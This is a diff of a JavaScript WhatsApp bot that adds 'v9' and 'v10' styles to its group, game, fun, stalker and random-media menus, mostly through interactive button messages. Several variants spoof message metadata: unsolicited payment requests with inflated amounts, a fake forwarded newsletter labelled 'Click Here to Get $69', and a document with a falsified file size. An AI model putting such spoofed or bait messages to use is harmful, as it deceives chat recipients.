+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'groupmenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${groupmenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${groupmenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -7774,7 +8803,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -7820,7 +8849,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -7829,18 +8858,309 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
+}
+break
+case 'gamemenu': {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${gamemenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v2') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        text: xmenu_oh,
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: m
+                    })
+                }   if (typemenu === 'v3') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v4') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh,
+                        gifPlayback: true
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v5') {
+                    XeonBotInc.relayMessage(m.chat, {
+                        scheduledCallCreationMessage: {
+                            callType: "AUDIO",
+                            scheduledTimestampMs: 1200,
+                            title: xmenu_oh
+                        }
+                    }, {})
+                } else if (typemenu === 'v6') {
+                    XeonBotInc.relayMessage(m.chat,  {
+                       requestPaymentMessage: {
+                          currencyCodeIso4217: 'INR',
+                          amount1000: '9999999900',
+                          requestFrom: m.sender,
+                          noteMessage: {
+                             extendedTextMessage: {
+                                text: xmenu_oh,
+                                contextInfo: {
+                                   externalAdReply: {
+                                       showAdAttribution: true
+                                   }
+                                }
+                             }
+                          }
+                       }
+                    }, {})
+                } else if (typemenu === 'v7') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        document: {
+                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
+                        },
+                        caption: xmenu_oh,
+                        mimetype: 'application/zip',
+                        fileName: ownername,
+                        fileLength: "99999999999",
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: fstatus 
+                    })
+                } else if (typemenu === 'v8') {
+                	XeonBotInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+      gifPlayback: true,
+      caption: xmenu_oh,
+      contextInfo: {
+      externalAdReply: {
+      title: botname,
+      body: ownername,
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
+      sourceUrl: ``,
+      mediaType: 1,
+      renderLargerThumbnail: true
+      }
+      }
+      }, {
+                        quoted: m
+                    })
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'funmenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${funmenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${funmenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -7891,7 +9211,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '123456789000000',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -7937,7 +9257,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -7946,18 +9266,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'stalkermenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${stalkermenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${stalkermenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -8008,7 +9415,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '1234567890000',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -8054,7 +9461,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -8063,18 +9470,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'randomphotomenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${randphotomenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${randomphotomenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -8125,7 +9619,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -8171,7 +9665,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -8180,18 +9674,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'randomvideomenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${randvideomenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${randomvideomenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -8242,7 +9823,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -8288,7 +9869,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -8297,18 +9878,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'photooxymenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-    │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${photooxymenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
